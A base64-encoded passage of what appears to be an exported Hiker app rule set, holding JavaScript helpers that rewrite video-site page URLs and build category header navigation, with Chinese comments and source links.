ICAgICAgICAgIHVybFBhcmFtWzJdLnB1c2goJ1VzZXItQWdlbnRAJyArIFBDX1VBLnJlcGxhY2UoLzsvZywgJ++8m++8mycpLnJlcGxhY2UoL1xcXFxcXFxcPy8sICfvvJ/vvJ8nKSlcXFxcbiAgICAgICAgZWxzZSBpZiAodWEgPT0gJ21vYmlsZScpXFxcXG4gICAgICAgICAgICB1cmxQYXJhbVsyXS5wdXNoKCdVc2VyLUFnZW50QCcgKyBNT0JJTEVfVUEucmVwbGFjZSgvOy9nLCAn77yb77ybJykucmVwbGFjZSgvXFxcXFxcXFw/LywgJ++8n++8nycpKVxcXFxuICAgIH1cXFxcbiAgICBpZiAoUmVmZXJlciAmJiAhdXJsUGFyYW1bMl0uc29tZSgodikgPT4gdi5zdGFydHNXaXRoKCdSZWZlcmVyQCcpKSlcXFxcbiAgICAgICAgdXJsUGFyYW1bMl0ucHVzaChSZWZlcmVyKVxcXFxuICAgIHVybFBhcmFtWzJdID0gJ3snICsgdXJsUGFyYW1bMl0uam9pbignJiYnKSArICd9J1xcXFxuICAgIHJldHVybiB1cmxQYXJhbS5qb2luKCc7JylcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLpk77mjqXlpITnkIZb5LqMXSpcXFwiLFxcXCJwYXRoXFxcIjpcXFwidXJsLXByb2Nlc3NvclxcXCIsXFxcInJ1bGVcXFwiOlxcXCIvKipcXFxcbiAqIOeggeS6kSBHaXRlZSDpk77mjqUgaHR0cHM6Ly9naXRodWIuamV2b25zLnZpcC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUVExOTkzSFVBTkcvWU1KL21haW4v6ZiF5Yqo5ryrLmpzb25cXFxcbiAqL1xcXFxuZnVuY3Rpb24gVXJsUHJvY2Vzc29yKCkge1xcXFxuICAgIHRoaXMucGFyYW1zID0ge31cXFxcbiAgICB0aGlzLnJlZ2V4TWFwID0gW1xcXFxuICAgICAgICB7XFxcXG4gICAgICAgICAgICByZWc6ICcodm9kdHlwZXx2aWRlb3QpXFxcXFxcXFxcXFxcXFxcXC9cXFxcXFxcXFxcXFxcXFxcdysnLFxcXFxuICAgICAgICAgICAgZXhlYzogKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLnBhcmFtcy51cmxcXFxcbiAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLy1cXFxcXFxcXGQrLmh0bWwvLCAnLScgKyB0aGlzLnBhcmFtcy5wYWdlICsgJy5odG1sJylcXFxcbiAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLygodm9kdHlwZXx2aWRlb3QpXFxcXFxcXFwvXFxcXFxcXFx3KykuaHRtbC8sICckMS0nICsgdGhpcy5wYXJhbXMucGFnZSArICcuaHRtbCcpXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIHtcXFxcbiAgICAgICAgICAgIHJlZzogJ1xcXFxcXFxcXFxcXFxcXFwvP1tcXFxcXFxcXFxcXFxcXFxcd1xcXFxcXFxcXFxcXFxcXFxkXSstLio/LS4qPy0uKj8tLio/LS4qPy0uKj8tLio/LVxcXFxcXFxcXFxcXFxcXFxkKi0tLVxcXFxcXFxcXFxcXFxcXFxkKi5odG1sJyxcXFxcbiAgICAgICAgICAgIGV4ZWM6ICgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5wYXJhbXMudXJsXFxcXG4gICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC9cXFxcXFxcXGQqKC0tLS5odG1sKS8sIHRoaXMucGFyYW1zLnBhZ2UgKyAnJDEnKVxcXFxuICAgICAgICAgICAgICAgICAgICAucmVwbGFjZSgvKC0tLVxcXFxcXFxcZCsuaHRtbCkvLCB0aGlzLnBhcmFtcy5wYWdlICsgJyQxJyk7IC8vIOaLvOaOpemhteeggVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9LFxcXFxuICAgICAgICB7XFxcXG4gICAgICAgICAgICByZWc6ICcoKFxcXFxcXFxcXFxcXFxcXFwvdm9kXFxcXFxcXFxcXFxcXFxcXC9zaG93KT8oXFxcXFxcXFxcXFxcXFxcXC9hcmVhXFxcXFxcXFxcXFxcXFxcXC9bXFxcXFxcXFxcXFxcXFxcXHdcXFxcXFxcXFxcXFxcXFxcZCVdKyk/KFxcXFxcXFxcXFxcXFxcXFwvYnlcXFxcXFxcXFxcXFxcXFxcL1tcXFxcXFxcXFxcXFxcXFxcd1xcXFxcXFxcXFxcXFxcXFxkJV0rKT8oXFxcXFxcXFxcXFxcXFxcXC9pZFxcXFxcXFxcXFxcXFxcXFwvXFxcXFxcXFxcXFxcXFxcXGQrKT8oXFxcXFxcXFxcXFxcXFxcXC9sZXR0ZXJcXFxcXFxcXFxcXFxcXFxcL1tcXFxcXFxcXFxcXFxcXFxcd1xcXFxcXFxcXFxcXFxcXFxkJV0rKT8pKFxcXFxcXFxcXFxcXFxcXFwvcGFnZVxcXFxcXFxcXFxcXFxcXFwvXFxcXFxcXFxcXFxcXFxcXGQrKT8oXFxcXFxcXFxcXFxcXFxcXC95ZWFyXFxcXFxcXFxcXFxcXFxcXC9cXFxcXFxcXFxcXFxcXFxcZCspP1xcXFxcXFxcXFxcXFxcXFwuaHRtbCcsXFxcXG4gICAgICAgICAgICBleGVjOiAoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHJlZ0V4cCA9IC8oKFxcXFxcXFxcL3ZvZFxcXFxcXFxcL3Nob3cpPyhcXFxcXFxcXC9hcmVhXFxcXFxcXFwvW1xcXFxcXFxcd1xcXFxcXFxcZCVdKyk/KFxcXFxcXFxcL2J5XFxcXFxcXFwvW1xcXFxcXFxcd1xcXFxcXFxcZCVdKyk/KFxcXFxcXFxcL2lkXFxcXFxcXFwvXFxcXFxcXFxkKyk/KFxcXFxcXFxcL2xldHRlclxcXFxcXFxcL1tcXFxcXFxcXHdcXFxcXFxcXGQlXSspPykoXFxcXFxcXFwvcGFnZVxcXFxcXFxcL1xcXFxcXFxcZCspPyhcXFxcXFxcXC95ZWFyXFxcXFxcXFwvXFxcXFxcXFxkKyk/XFxcXFxcXFwuaHRtbC9cXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5wYXJhbXMudXJsXFxcXG4gICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKHJlZ0V4cCwgJyQxJyArIChcXFxcXFxcIi9wYWdlL1xcXFxcXFwiICsgdGhpcy5wYXJhbXMucGFnZSkgKyAnJDgnICsgXFxcXFxcXCIuaHRtbFxcXFxcXFwiKVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgXVxcXFxufVxcXFxuXFxcXG5PYmplY3QuYXNzaWduKFVybFByb2Nlc3Nvci5wcm90b3R5cGUsIHtcXFxcbiAgICBjb25zdHJ1Y3RvcjogVXJsUHJvY2Vzc29yLFxcXFxuICAgIGNoZWNrUGFyYW1zKCkge1xcXFxuICAgICAgICBpZiAoIXRoaXMucGFyYW1zLnVybCkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+35YWI6LCD55SoIC5iYXNlVXJsKHVybCkg5Lyg5YWl6ZO+5o6l6L+b6KGM5Yid5aeL5YyWIVxcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmICghdGhpcy5wYXJhbXMucGFnZSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+35YWI6LCD55SoIC5wYWdlKHBhZ2UpIOS8oOWFpemhteeggei/m+ihjOWIneWni+WMliFcXFxcXFxcIilcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG4gICAgYmFzZVVybCh1cmwpe1xcXFxuICAgICAgICB0aGlzLnBhcmFtcy51cmwgPSB1cmxcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIHBhZ2UocGFnZSl7XFxcXG4gICAgICAgIHRoaXMucGFyYW1zLnBhZ2UgPSBwYWdlXFxcXG4gICAgICAgIHJldHVybiB0aGlzXFxcXG4gICAgfSxcXFxcbiAgICBhZGRFeHRyYShyZWdFeHApIHtcXFxcbiAgICAgICAgaWYgKHJlZ0V4cC5jb25zdHJ1Y3RvciA9PT0gQXJyYXkpIHtcXFxcbiAgICAgICAgICAgIHRoaXMucmVnZXhNYXAgPSB0aGlzLnJlZ2V4TWFwLmNvbmNhdChyZWdFeHApXFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICB0aGlzLnJlZ2V4TWFwLnB1c2gocmVnRXhwKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgIH0sXFxcXG4gICAgZGVidWcoKSB7XFxcXG4gICAgICAgIHRoaXMucGFyYW1zLmRlYnVnID0gdHJ1ZVxcXFxuICAgICAgICByZXR1cm4gdGhpcztcXFxcbiAgICB9LFxcXFxuICAgIGV4ZWMoKSB7XFxcXG4gICAgICAgIHRoaXMuY2hlY2tQYXJhbXMoKVxcXFxuICAgICAgICBsZXQgdHJ1ZV91cmwgPSAnJ1xcXFxuICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHRoaXMucmVnZXhNYXAubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgIGxldCByZWdPYmogPSB0aGlzLnJlZ2V4TWFwW2ldO1xcXFxuICAgICAgICAgICAgbGV0IHVybEV4cCA9IHJlZ09iai5yZWc7XFxcXG4gICAgICAgICAgICBpZiAodHlwZW9mIHVybEV4cCA9PT0gJ3N0cmluZycpIHtcXFxcbiAgICAgICAgICAgICAgICB1cmxFeHAgPSBuZXcgUmVnRXhwKHVybEV4cClcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGlmICh1cmxFeHAudGVzdCh0aGlzLnBhcmFtcy51cmwpKSB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHRoaXMucGFyYW1zLmRlYnVnKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxvZyh1cmxFeHAudG9TdHJpbmcoKSlcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgdHJ1ZV91cmwgPSByZWdPYmouZXhlYygpO1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmICh0cnVlX3VybCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHRydWVfdXJsO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHRoaXMucGFyYW1zLnVybFxcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICDojrflj5blpITnkIbnu5PmnpwoKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLmV4ZWMoKVxcXFxuICAgIH0sXFxcXG4gICAg6ZO+5o6lKHVybCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5iYXNlVXJsKHVybClcXFxcbiAgICB9LFxcXFxuICAgIOmhteeggShwYWdlKSB7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLnBhZ2UocGFnZSlcXFxcbiAgICB9LFxcXFxuICAgIOaPkuWFpeaWsOWkhOeQhuinhOWImShyZWdFeHApIHtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXMuYWRkRXh0cmEocmVnRXhwKVxcXFxuICAgIH0sXFxcXG4gICAg6LCD6K+V5qih5byPKCkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5kZWJ1ZygpO1xcXFxuICAgIH1cXFxcbn0pXFxcXG4kLmV4cG9ydHM9bmV3IFVybFByb2Nlc3NvcigpXFxcXG4kLmV4cG9ydHNcXFxcblxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuWKqOaAgVvkuIBdKlxcXCIsXFxcInBhdGhcXFwiOlxcXCJjYXRlZ29yaWVzLWhlYWRlclxcXCIsXFxcInJ1bGVcXFwiOlxcXCIvKipcXFxcbiAqIOacrOWcsOe9kemhteaPkuS7tumTvuaOpSBoaWtlcjovL2ZpbGVzL3J1bGVzL2pzL2NhdGVnb3JpZXMtaGVhZGVyLmpzXFxcXG4gKiDlrZDpobXpnaLpk77mjqUgaGlrZXI6Ly9wYWdlL2NhdGVnb3JpZXMtaGVhZGVyXFxcXG4gKiDpgZPplb/ku5PlupPpk77mjqUgaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9MjcwNVxcXFxuICog56CB5LqRIEdpdGVlIOmTvuaOpSBodHRwczovL2dpdGVlLmNvbS9yZWJvcm4wL0hpa2VyUnVsZXMvcmF3L21hc3Rlci9wbHVnaW5zL2NhdGVnb3JpZXMtaGVhZGVyLmpzXFxcXG4gKi9cXFxcbi8qKlxcXFxuICogT2JqZWN0LmFzc2lnbiDnlKjms5Xlj4LogIPpk77mjqVcXFxcbiAqXFxcXG4gKiAxLmh0dHBzOi8vd3d3LmRhaW1hamlhb2xpdS5jb20vZGFpbWEvNDcxMzlhOWU3MTAwNDA3XFxcXG4gKiAyLmh0dHBzOi8vc2VnbWVudGZhdWx0LmNvbS9hLzExOTAwMDAwMTE3Nzg4NzVcXFxcbiAqIDMuaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvT2JqZWN0L2Fzc2lnblxcXFxuICovXFxcXG4vLyDliKnnlKggU3ltYm9sIOWunueOsOengeacieWPmOmHj+WSjOengeacieaWueazle+8jOWklueVjOS4jeWPr+iuv+mXru+8iOWPguiAg+mTvuaOpTLvvIlcXFxcbmNvbnN0IHN5bWJvbE1hcCA9IHtcXFxcbiAgICAvLyBjaGVja1BhcmFtczogU3ltYm9sKCdjaGVja1BhcmFtcycpLFxcXFxuICAgIG1MYXlvdXQ6IFN5bWJvbCgnbUxheW91dCcpLFxcXFxuICAgIHRydWVfdXJsOiBTeW1ib2woJ3RydWVfdXJsJyksXFxcXG4gICAgbVBhZ2U6IFN5bWJvbCgnbVBhZ2UnKSxcXFxcbiAgICBzcmM6IFN5bWJvbCgnc3JjJyksXFxcXG4gICAgcnVsZU9iakxpc3Q6IFN5bWJvbCgncnVsZU9iakxpc3QnKSxcXFxcbiAgICBtRm9sZDogU3ltYm9sKCdtRm9sZCcpLFxcXFxuICAgIG1Gb2xkSW5uZXJFbmFibGU6IFN5bWJvbCgnbUZvbGRJbm5lckVuYWJsZScpLFxcXFxuICAgIG1Gb2xkSW5kZXg6IFN5bWJvbCgnbUZvbGRJbmRleCcpLFxcXFxuICAgIG1Gb2xkTGF5b3V0OiBTeW1ib2woJ21Gb2xkTGF5b3V0JyksXFxcXG4gICAgbUNvbG9yOiBTeW1ib2woJ21Db2xvcicpLFxcXFxuICAgIG1UYWc6IFN5bWJvbCgnbVRhZycpLFxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBDYXRlZ29yaWVzSGVhZGVyKGNvbG9yKSB7XFxcXG4gICAgLy8gJ3VzZSBzdHJpY3QnO1xcXFxuICAgIC8vIC4uLlxcXFxuICAgIC8vIHRoaXNbc3ltYm9sTWFwLmxpc3RSdWxlXSA9IFtdXFxcXG4gICAgLy8gdGhpc1tzeW1ib2xNYXAuc3ViTGlzdFJ1bGVdID0gW11cXFxcbiAgICB0aGlzW3N5bWJvbE1hcC5tQ29sb3JdID0gY29sb3IgfHwgXFxcXFxcXCIjRkE3Mjk4XFxcXFxcXCI7XFxcXG4gICAgdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdID0gW11cXFxcbiAgICB0aGlzLlZBUk1BUCA9IHtcXFxcbiAgICAgICAgQ0FURUdPUlk6IFxcXFxcXFwiaGVhZGVyLmNhdGVnb3J5XFxcXFxcXCIsXFxcXG4gICAgICAgIFVSTDogXFxcXFxcXCJoZWFkZXIudXJsXFxcXFxcXCIsXFxcXG4gICAgICAgIEZPTEQ6IFxcXFxcXFwiaGVhZGVyLmZvbGRcXFxcXFxcIixcXFxcbiAgICB9XFxcXG4gICAgdGhpc1tzeW1ib2xNYXAubUZvbGRMYXlvdXRdID0ge1xcXFxuICAgICAgICBpbmplY3RJbmRleDogMVxcXFxuICAgIH1cXFxcbiAgICB0aGlzW3N5bWJvbE1hcC5tRm9sZEluZGV4XSA9IDFcXFxcbn1cXFxcblxcXFxuT2JqZWN0LmFzc2lnbihDYXRlZ29yaWVzSGVhZGVyLnByb3RvdHlwZSwge1xcXFxuICAgIC8vIE92ZXJyaWRlIOaehOmAoOaWueazle+8jOebuOW9k+S6jiBmdW5jdGlvbi5wcm90b3R5cGUuY29uc3RydWN0b3IgPSAoLi4uKSA9PiB7Li4ufe+8jG5ldyBmdW5jdGlvbigpIOeahOaXtuWAmeS8muiHquWKqOaJp+ihjFxcXFxuICAgIGNvbnN0cnVjdG9yOiBDYXRlZ29yaWVzSGVhZGVyLFxcXFxuICAgIC8vIOWumuS5ieengeacieaWueazlVxcXFxuICAgIFZFUlNJT046IDIwMjExMTMwMTkwMCxcXFxcbiAgICBjaGVja1BhcmFtcygpIHtcXFxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5tTGF5b3V0XSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+36LCD55SoIGxheW91dChkKSDkvKDlhaXlvZPliY3nlYzpnaJcXFxcXFxcIilcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAoIXRoaXNbc3ltYm9sTWFwLnRydWVfdXJsXSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+36LCD55SoIHRydWVVcmwodXJsKSDkvKDlhaXlvZPliY3liIbnsbvnmoTpk77mjqVcXFxcXFxcIilcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAoIXRoaXNbc3ltYm9sTWFwLm1QYWdlXSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+36LCD55SoIHBhZ2UobVBhZ2UpIOS8oOWFpeW9k+WJjemhteaVsFxcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmICh0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0ubGVuZ3RoIDwgMSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6K+36LCD55So55u45YWz5pa55rOV5Lyg5YWl5a6a5L2N6KeE5YiZXFxcXFxcXCIpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5tRm9sZF0pIHtcXFxcbiAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkXSA9ICcwJ1xcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICBsYXlvdXQobUxheW91dCkge1xcXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5tTGF5b3V0XSA9IG1MYXlvdXRcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIHRydWVVcmwodXJsKSB7XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnRydWVfdXJsXSA9IHVybFxcXFxuICAgICAgICByZXR1cm4gdGhpc1xcXFxuICAgIH0sXFxcXG4gICAgcGFnZShtUGFnZSkge1xcXFxuICAgICAgICBpZiAodHlwZW9mIChtUGFnZSkgPT09ICdzdHJpbmcnKSB7XFxcXG4gICAgICAgICAgICBtUGFnZSA9IHBhcnNlSW50KG1QYWdlKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLm1QYWdlXSA9IG1QYWdlXFxcXG4gICAgICAgIHJldHVybiB0aGlzXFxcXG4gICAgfSxcXFxcbiAgICBodG1sKG1TcmMpIHtcXFxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAuc3JjXSA9IG1TcmNcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIGxpc3QocnVsZSkge1xcXFxuICAgICAgICBpZiAodGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdLmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcImxpc3QocnVsZSkgYWRkKHJ1bGVPYmopIOWPquiDveS6jOmAieS4gO+8gVxcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XSA9IFt7fV1cXFxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdLmxpc3RSdWxlID0gcnVsZVxcXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF1bJ+S4gOe6p+WIhuexuyddID0gcnVsZVxcXFxuICAgICAgICByZXR1cm4gdGhpc1xcXFxuICAgIH0sXFxcXG4gICAgc3ViTGlzdChydWxlKSB7XFxcXG4gICAgICAgIGlmICh0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0ubGVuZ3RoID4gMSkge1xcXFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwic3ViTGlzdChydWxlKSBhZGQocnVsZU9iaikg5Y+q6IO95LqM6YCJ5LiA77yBXFxcXFxcXCIpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0gfHwgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0ubGlzdFJ1bGUgJiYgIXRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXVsn5LiA57qn5YiG57G7J10pKSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7flhYjosIPnlKggbGlzdChydWxlKSDmiJYg5LiA57qn5YiG57G7KHJ1bGUpIOWumuS9jeS4gOe6p+WIhuexu1xcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXS5zdWJMaXN0UnVsZSA9IHJ1bGVcXFxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdWyflrZDliIbnsbsnXSA9IHJ1bGVcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIHRpdGxlKHJ1bGUpIHtcXFxcbiAgICAgICAgaWYgKHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XS5sZW5ndGggPiAxKSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCJ0aXRsZShydWxlKSBhZGQocnVsZU9iaikg5Y+q6IO95LqM6YCJ5LiA77yBXFxcXFxcXCIpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0gfHwgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0ubGlzdFJ1bGUgJiYgIXRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXVsn5LiA57qn5YiG57G7J10pKSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7flhYjosIPnlKggbGlzdChydWxlKSDmiJYg5LiA57qn5YiG57G7KHJ1bGUpIOWumuS9jeS4gOe6p+WIhuexu1xcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXS50aXRsZVJ1bGUgPSBydWxlXFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXVsn5YiG57G75qCH6aKYJ10gPSB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0udGl0bGVSdWxlXFxcXG4gICAgICAgIHJldHVybiB0aGlzXFxcXG4gICAgfSxcXFxcbiAgICB1cmwocnVsZSkge1xcXFxuICAgICAgICBpZiAodGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdLmxlbmd0aCA+IDEpIHtcXFxcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcInVybChydWxlKSBhZGQocnVsZU9iaikg5Y+q6IO95LqM6YCJ5LiA77yBXFxcXFxcXCIpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0gfHwgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0ubGlzdFJ1bGUgJiYgIXRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXVsn5LiA57qn5YiG57G7J10pKSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7flhYjosIPnlKggbGlzdChydWxlKSDmiJYg5LiA57qn5YiG57G7KHJ1bGUpIOWumuS9jeS4gOe6p+WIhuexu1xcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXS51cmxSdWxlID0gcnVsZVxcXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF1bJ+WIhuexu+mTvuaOpSddID0gdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdLnVybFJ1bGVcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIC8qKlxcXFxuICAgICAqIOaYr+WQpuW8gOWQr+aKmOWPoOWKn+iDvVxcXFxuICAgICAqXFxcXG4gICAgICogQHBhcmFtIGVuYWJsZWQgdHJ1ZSDooajnpLrlvIDlkK/vvIxmYWxzZSDooajnpLrnpoHnlKhcXFxcbiAgICAgKiBAcmV0dXJucyB7Q2F0ZWdvcmllc0hlYWRlcn1cXFxcbiAgICAgKi9cXFxcbiAgICBmb2xkSW5uZXIoZW5hYmxlZCkge1xcXFxuICAgICAgICBpZiAoISh0eXBlb2YgKGVuYWJsZWQpID09PSAnYm9vbGVhbicpKSB7XFxcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLor7fkvKDlhaUgdHJ1ZSDmiJYgZmFsc2Ug6KGo56S65byA5ZCv5oiW5YWz6Zet5oqY5Y+g5Yqf6IO977yBXFxcXFxcXCIpXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAubUZvbGRJbm5lckVuYWJsZV0gPSBlbmFibGVkXFxcXG4gICAgICAgIHJldHVybiB0aGlzXFxcXG4gICAgfSxcXFxcbiAgICAvKipcXFxcbiAgICAgKiDku47nrKwgaW5kZXgg6KGM5byA5aeL5oqY5Y+gXFxcXG4gICAgICpcXFxcbiAgICAgKiBAcGFyYW0gaW5kZXgg5byA5aeL5oqY5Y+g55qE6KGM5pWwXFxcXG4gICAgICogQHJldHVybnMge0NhdGVnb3JpZXNIZWFkZXJ9XFxcXG4gICAgICovXFxcXG4gICAgZm9sZEluZGV4KGluZGV4KSB7XFxcXG4gICAgICAgIGlmICghKHR5cGVvZiAoaW5kZXgpID09PSAnbnVtYmVyJykpIHtcXFxcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuW8gOWni+aKmOWPoOihjOivt+S8oOWFpeaVsOWtl++8gVxcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChpbmRleCA8IDEpIHtcXFxcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuW8gOWni+aKmOWPoOihjOivt+S8oOWFpeWkp+S6jiAwIOeahOaVtOaVsO+8gVxcXFxcXFwiKVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkSW5kZXhdID0gaW5kZXggfHwgMTtcXFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXFxcbiAgICB9LFxcXFxuICAgIC8qKlxcXFxuICAgICAqIOaKmOWPoOaMiemSrueahOeVjOmdolxcXFxuICAgICAqXFxcXG4gICAgICogQHBhcmFtIGxheW91dCDkuI4gZC5wdXNoIOe7k+aehOS4gOiHtO+8jFxcXFxuICAgICAqICAgICAgICDkvovvvJp7IHRpdGxlOlxcXFxcXFwi5qCH6aKYMVxcXFxcXFwiLCB1cmw6XFxcXFxcXCJ4eHhcXFxcXFxcIiwgY29sX3R5cGU6XFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCIgfTtcXFxcbiAgICAgKiAgICAgICAg5Y+C5pWw6YeH55So5Y+v6YCJ6KaG55uW5qih5byP77yM5LiN5YaZ55qE5Y+C5pWw5YiZ5L2/55So6buY6K6kO1xcXFxuICAgICAqICAgICAgICDmr5TlpoLkvKD